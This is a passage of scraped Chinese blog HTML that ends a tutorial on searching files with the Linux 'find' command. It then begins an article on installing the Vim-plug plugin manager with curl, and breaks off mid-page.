title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ <span class=\"MathJax_Preview\">\\( -iname '*jpeg' -o -iname '*jpg' \\)</span> -type d\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625262b3ad1610023533-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625262b3ad1610023533-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625262b3ad1610023533-1\"><span class=\"crayon-e\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpeg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">d</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625262b3ad1610023533-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>你最近拍了很多照片，所以让我们把它缩小到上周更改的文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625262b3ad4922090903\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ <span class=\"MathJax_Preview\">\\( -iname '*jpeg' -o -iname '*jpg' \\)</span> -type f -mtime -7\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625262b3ad4922090903-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625262b3ad4922090903-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625262b3ad4922090903-1\"><span class=\"crayon-e\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpeg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">iname</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'*jpg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">mtime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625262b3ad4922090903-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>你可以根据文件状态更改时间 （<code>ctime</code>）、修改时间 （<code>mtime</code>） 或访问时间 （<code>atime</code>） 来执行时间过滤。 这些是在几天内，所以如果你想要更细粒度的控制，你可以表示为在几分钟内（分别是 <code>cmin</code>、<code>mmin</code> 和 <code>amin</code>）。 除非你确切地知道你想要的时间，否则你可能会在 <code>+</code> （大于）或 <code>-</code> （小于）的后面加上数字。</p>\n<p>但也许你不关心你的照片。也许你的磁盘空间不够用，所以你想在 <code>log</code> 目录下找到所有巨大的（让我们定义为“大于 1GB”）文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625262b3ad8924445749\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind /var/log -size +1G\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625262b3ad8924445749-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625262b3ad8924445749-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625262b3ad8924445749-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1G</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625262b3ad8924445749-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>或者，也许你想在 <code>/data</code> 中找到 bcotton 拥有的所有文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625262b3adb518647457\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind /data -owner bcotton\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625262b3adb518647457-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625262b3adb518647457-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625262b3adb518647457-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">data</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">owner </span><span class=\"crayon-i\">bcotton</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625262b3adb518647457-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>你还可以根据权限查找文件。也许你想在你的主目录中找到对所有人可读的文件，以确保你不会过度分享。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625262b3ade520357718\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind ~ -perm -o=r\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625262b3ade520357718-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625262b3ade520357718-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625262b3ade520357718-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">perm</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">o</span><span class=\"crayon-o\">=</span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625262b3ade520357718-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这篇文章只说了 <code>find</code> 能做什么的表面。将测试条件与布尔逻辑相结合可以为你提供难以置信的灵活性，以便准确找到要查找的文件。并且像 <code>-exec</code> 或 <code>-delete</code> 这样的参数，你可以让 <code>find</code> 对它发现的内容采取行动。你有任何最喜欢的 <code>find</code> 表达式么？在评论中分享它们！</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114000\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114000votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114000\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"url_object_id": "a00b9ec8e1a1878cf2a49e643d90596d", "title": ["Vim-plug：极简 Vim 插件管理器"], "url": "http://blog.jobbole.com/114132/", "create_date": "2018/06/17", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/e10fe1fd7da125e34ea34b9f5dad9c30.png"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 0, "tags": "IT技术, Linux, Vim", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/vim-plug-a-minimalist-vim-plugin-manager/\">Sk</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9751-1.html\">Linux中国/geekpi</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/e10fe1fd7da125e34ea34b9f5dad9c30.png\" alt=\"\"></p>\n<p>当没有插件管理器时，Vim 用户必须手动下载 tarball 包形式的插件，并将它们解压到 <code>~/.vim</code> 目录中。在少量插件的时候可以。但当他们安装更多的插件时，就会变得一团糟。所有插件文件分散在单个目录中，用户无法找到哪个文件属于哪个插件。此外，他们无法找到他们应该删除哪个文件来卸载插件。这时 Vim 插件管理器就可以派上用场。插件管理器将安装插件的文件保存在单独的目录中，因此管理所有插件变得非常容易。我们几个月前已经写了关于 <a href=\"https://linux.cn/article-9416-1.html\">Vundle</a> 的文章。今天，我们将看到又一个名为 “Vim-plug” 的 Vim 插件管理器。</p>\n<p>Vim-plug 是一个自由、开源、速度非常快的、极简的 vim 插件管理器。它可以并行地安装或更新插件。你还可以回滚更新。它创建浅层克隆shallow clone最小化磁盘空间使用和下载时间。它支持按需加载插件以加快启动时间。其他值得注意的特性是支持分支/标签/提交、post-update 钩子、支持外部管理的插件等。</p>\n<h3 id=\"toc_1\">安装</h3>\n<p>安装和使用起来非常容易。你只需打开终端并运行以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10acc3369174193\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10acc3369174193-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10acc3369174193-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10acc3369174193-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">curl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fLo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">vim</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">autoload</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">plug</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">vim</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">create</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dirs </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10acc3369174193-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>Neovim 用户可以使用以下命令安装 Vim-plug：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10accd129752110\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ curl -fLo ~/.config/nvim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe10accd129752110-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe10accd129752110-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe10accd129752110-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">curl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fLo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">config</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nvim</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">autoload</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">plug</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">vim</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">create</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dirs </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe10accd129752110-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">用法</h3>\n<h4 id=\"toc_3\">安装插件</h4>\n<p>要安装插件，你必须如下所示首先在 Vim 配置文件中声明它们。一般 Vim 的配置文件是 <code>~/.vimrc</code>，Neovim 的配置文件是 <code>~/.config/nvim/init.vim</code>。请记住，当你在配置文件中声明插件时，列表应该以 <code>call plug#begin(PLUGIN_DIRECTORY)</code> 开始，并以 <code>plug#end()</code> 结束。</p>\n<p>例如，我们安装 “lightline.vim” 插件。为此，请在 <code>~/.vimrc</code> 的顶部添加以下行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe10acd1179416621\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc 